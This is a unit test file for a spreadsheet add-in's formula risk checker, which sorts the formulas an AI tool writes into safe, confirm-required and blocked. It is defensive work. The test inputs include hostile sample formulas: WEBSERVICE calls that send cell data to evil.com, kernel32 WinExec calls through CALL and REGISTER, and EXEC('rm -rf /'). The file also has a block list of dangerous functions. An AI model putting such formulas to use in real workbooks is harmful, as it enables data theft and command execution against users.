/**
 * Unit tests for formula-allowlist.ts — pre-execution validation layer.
 *
 * Tests:
 *  - extractFunctionNames: parses function calls from formula strings
 *  - analyzeFormulaRisk: classifies formulas as safe / confirm / blocked
 *  - analyzeToolArgsRisk: scans tool args for risky formulas
 *  - Dangerous scenarios: WEBSERVICE, CALL, HYPERLINK, EXEC, REGISTER.ID, etc.
 */
import {
  extractFunctionNames,
  analyzeFormulaRisk,
  analyzeToolArgsRisk,
  BLOCKED_FUNCTIONS,
  CONFIRM_REQUIRED_FUNCTIONS,
  SAFE_FUNCTIONS,
} from "../src/taskpane/tools/formula-allowlist";

// ===========================================================================
// extractFunctionNames
// ===========================================================================

describe("extractFunctionNames", () => {
  test("extracts single function", () => {
    expect(extractFunctionNames("SUM(A1:B2)")).toEqual(["SUM"]);
  });

  test("extracts nested functions", () => {
    expect(extractFunctionNames("IF(A1>0, VLOOKUP(B1,C:D,2,0), 0)")).toEqual([
      "IF",
      "VLOOKUP",
    ]);
  });

  test("returns empty for pure arithmetic", () => {
    expect(extractFunctionNames("A1+B2*C3")).toEqual([]);
  });

  test("extracts Russian function names", () => {
    expect(extractFunctionNames("СУММ(A1:A10)")).toEqual(["СУММ"]);
  });

  test("extracts mixed Russian and English", () => {
    expect(extractFunctionNames("ЕСЛИ(A1>0, SUM(B1:B2), 0)")).toEqual([
      "ЕСЛИ",
      "SUM",
    ]);
  });

  test("does not match cell references as functions", () => {
    expect(extractFunctionNames("A1+B2")).toEqual([]);
  });

  test("handles whitespace before paren", () => {
    expect(extractFunctionNames("SUM (A1:B2)")).toEqual(["SUM"]);
  });

  test("handles multiple chained calls", () => {
    expect(
      extractFunctionNames('ROUND(SUM(A1:A10), 2) & TEXT(NOW(), "YYYY")'),
    ).toEqual(["ROUND", "SUM", "TEXT", "NOW"]);
  });

  test("handles empty string", () => {
    expect(extractFunctionNames("")).toEqual([]);
  });

  test("dedupes repeated functions", () => {
    // Note: extractFunctionNames does NOT dedupe — that's analyzeFormulaRisk's job.
    const result = extractFunctionNames("SUM(A1) + SUM(B1)");
    expect(result).toEqual(["SUM", "SUM"]);
  });
});

// ===========================================================================
// analyzeFormulaRisk
// ===========================================================================

describe("analyzeFormulaRisk", () => {
  // ── Safe formulas ──

  test("safe: simple SUM", () => {
    const r = analyzeFormulaRisk("SUM(A1:A10)");
    expect(r.level).toBe("safe");
    expect(r.hasFunctions).toBe(true);
    expect(r.description).toContain("безопасны");
  });

  test("safe: nested VLOOKUP", () => {
    const r = analyzeFormulaRisk('IFERROR(VLOOKUP(A1, B:C, 2, 0), "")');
    expect(r.level).toBe("safe");
  });

  test("safe: Russian functions", () => {
    const r = analyzeFormulaRisk("СУММ(A1:A10) + СРЗНАЧ(B1:B10)");
    expect(r.level).toBe("safe");
  });

  test("safe: no functions (pure arithmetic)", () => {
    const r = analyzeFormulaRisk("A1*B2+C3");
    expect(r.level).toBe("safe");
    expect(r.hasFunctions).toBe(false);
  });

  // ── Blocked formulas ──

  test("blocked: WEBSERVICE", () => {
    const r = analyzeFormulaRisk(
      'WEBSERVICE("http://evil.com/exfil?data="&A1)',
    );
    expect(r.level).toBe("blocked");
    expect(r.description).toContain("WEBSERVICE");
    expect(r.functions[0].reason).toContain("HTTP");
  });

  test("blocked: FILTERXML", () => {
    const r = analyzeFormulaRisk('FILTERXML(WEBSERVICE("http://x"), "//a")');
    expect(r.level).toBe("blocked");
    expect(r.detected).toContain("WEBSERVICE");
    expect(r.detected).toContain("FILTERXML");
  });

  test("blocked: CALL (DLL invocation)", () => {
    const r = analyzeFormulaRisk(
      'CALL("kernel32", "WinExec", "JC", "calc.exe", 0)',
    );
    expect(r.level).toBe("blocked");
    expect(r.description).toContain("CALL");
  });

  test("blocked: REGISTER.ID", () => {
    const r = analyzeFormulaRisk('REGISTER.ID("kernel32", "WinExec")');
    expect(r.level).toBe("blocked");
  });

  test("blocked: EXEC", () => {
    const r = analyzeFormulaRisk('EXEC("rm -rf /")');
    expect(r.level).toBe("blocked");
  });

  test("blocked: Excel 4.0 macro REGISTER", () => {
    const r = analyzeFormulaRisk('REGISTER("kernel32", "WinExec")');
    expect(r.level).toBe("blocked");
  });

  test("blocked: EVALUATE", () => {
    const r = analyzeFormulaRisk('EVALUATE("1+1")');
    expect(r.level).toBe("blocked");
  });

  test("blocked: CHAR (obfuscation vector)", () => {
    const r = analyzeFormulaRisk("CHAR(65)");
    expect(r.level).toBe("blocked");
  });

  // ── Confirm-required ──

  test("confirm: HYPERLINK", () => {
    const r = analyzeFormulaRisk('HYPERLINK("http://example.com", "Click")');
    expect(r.level).toBe("confirm");
    expect(r.description).toContain("HYPERLINK");
    expect(r.functions[0].reason).toContain("ссылк");
  });

  // ── Combined risk levels ──

  test("blocked wins over confirm", () => {
    const r = analyzeFormulaRisk('HYPERLINK(WEBSERVICE("http://x"), "click")');
    expect(r.level).toBe("blocked");
  });

  test("confirm wins over safe", () => {
    const r = analyzeFormulaRisk('HYPERLINK("http://x", SUM(A1:A2))');
    expect(r.level).toBe("confirm");
  });

  test("dedupes repeated functions in report", () => {
    const r = analyzeFormulaRisk("SUM(A1) + SUM(B1) + SUM(C1)");
    expect(r.functions.filter((f) => f.name === "SUM")).toHaveLength(1);
  });
});

// ===========================================================================
// analyzeToolArgsRisk
// ===========================================================================

describe("analyzeToolArgsRisk", () => {
  test("safe: setValues with plain values", () => {
    const r = analyzeToolArgsRisk("setValues", {
      address: "A1:B2",
      values: [
        ["hello", "42"],
        ["world", "99"],
      ],
    });
    expect(r.level).toBe("safe");
    expect(r.formulaReports).toHaveLength(0);
  });

  test("safe: setValues with safe formulas", () => {
    const r = analyzeToolArgsRisk("setValues", {
      address: "A1:A2",
      values: [["=SUM(B1:B2)"], ["=A1*2"]],
    });
    expect(r.level).toBe("safe");
    expect(r.formulaReports).toHaveLength(2);
  });

  test("blocked: setValues with WEBSERVICE formula", () => {
    const r = analyzeToolArgsRisk("setValues", {
      address: "A1",
      values: [['=WEBSERVICE("http://evil.com")']],
    });
    expect(r.level).toBe("blocked");
    expect(r.description).toContain("WEBSERVICE");
  });

  test("blocked: setFormula with CALL", () => {
    const r = analyzeToolArgsRisk("setFormula", {
      cellAddress: "A1",
      formula: 'CALL("kernel32", "WinExec", "JC", "calc.exe", 0)',
    });
    expect(r.level).toBe("blocked");
  });

  test("confirm: setFormula with HYPERLINK", () => {
    const r = analyzeToolArgsRisk("setFormula", {
      cellAddress: "A1",
      formula: 'HYPERLINK("http://x", "click")',
    });
    expect(r.level).toBe("confirm");
  });

  test("safe: setFormula with VLOOKUP", () => {
    const r = analyzeToolArgsRisk("setFormula", {
      cellAddress: "A1",
      formula: "VLOOKUP(B1, C:D, 2, 0)",
    });
    expect(r.level).toBe("safe");
  });

  test("safe: tool with no formula args", () => {
    const r = analyzeToolArgsRisk("applyFormat", {
      address: "A1:F50",
      format: "#,##0.00",
    });
    expect(r.level).toBe("safe");
    expect(r.description).toContain("applyFormat");
  });

  test("blocked: mixed values with one dangerous formula", () => {
    const r = analyzeToolArgsRisk("setValues", {
      address: "A1:A3",
      values: [["=SUM(B1:B2)"], ["hello"], ['=EXEC("cmd.exe")']],
    });
    expect(r.level).toBe("blocked");
    expect(r.formulaReports).toHaveLength(2);
  });

  test("handles missing args gracefully", () => {
    const r = analyzeToolArgsRisk("unknownTool", {});
    expect(r.level).toBe("safe");
  });

  test("handles formula with leading = in setFormula", () => {
    const r = analyzeToolArgsRisk("setFormula", {
      cellAddress: "A1",
      formula: "=SUM(A1:A2)",
    });
    expect(r.level).toBe("safe");
    expect(r.formulaReports).toHaveLength(1);
  });
});

// ===========================================================================
// Constants sanity checks
// ===========================================================================

describe("allowlist constants", () => {
  test("BLOCKED_FUNCTIONS contains all required dangerous functions", () => {
    const required = [
      "WEBSERVICE",
      "FILTERXML",
      "CALL",
      "REGISTER.ID",
      "EXEC",
      "REGISTER",
      "EVALUATE",
    ];
    for (const fn of required) {
      expect(BLOCKED_FUNCTIONS.has(fn)).toBe(true);
    }
  });

  test("CONFIRM_REQUIRED_FUNCTIONS contains HYPERLINK", () => {
    expect(CONFIRM_REQUIRED_FUNCTIONS.has("HYPERLINK")).toBe(true);
  });

  test("no overlap between BLOCKED and CONFIRM_REQUIRED", () => {
    for (const fn of CONFIRM_REQUIRED_FUNCTIONS) {
      expect(BLOCKED_FUNCTIONS.has(fn)).toBe(false);
    }
  });

  test("no overlap between BLOCKED and SAFE", () => {
    for (const fn of SAFE_FUNCTIONS) {
      expect(BLOCKED_FUNCTIONS.has(fn)).toBe(false);
    }
  });

  test("SAFE_FUNCTIONS contains common functions", () => {
    expect(SAFE_FUNCTIONS.has("SUM")).toBe(true);
    expect(SAFE_FUNCTIONS.has("VLOOKUP")).toBe(true);
    expect(SAFE_FUNCTIONS.has("IF")).toBe(true);
    expect(SAFE_FUNCTIONS.has("СУММ")).toBe(true);
  });
});
